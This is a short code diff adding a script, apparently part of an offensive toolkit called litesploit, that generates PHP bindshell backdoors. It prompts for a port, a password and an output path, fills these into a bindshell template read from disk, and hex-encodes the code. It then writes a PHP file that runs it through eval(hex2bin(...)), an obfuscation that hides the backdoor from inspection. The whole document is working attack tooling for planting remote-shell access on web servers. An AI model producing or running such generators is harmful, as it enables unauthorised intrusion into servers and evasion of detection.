@@ -1,0 +1,24 @@
+load "file"
+
+print "PHP Bindshell Generator\n"
+print "Set port: "
+input.start()
+    @port = input.value
+input.close()
+
+print "Set password: "
+input.start()
+    @password = input.value
+input.close()
+
+print "Set location save: "
+input.start()
+    @location = input.value
+    @body = file.read("/etc/litesploit/modules/generate/bindshell/php_bindshell.code")
+    @body = str_replace("port_change", @port, @body)
+    @body = str_replace("password_change", @password, @body)
+    @body = bin2hex(@body)
+    @body = "<?php eval(hex2bin('".@body."'));"
+    file.create(@location, @body)
+    print "[*] Bindshell created ".@location."\n"
+input.close()
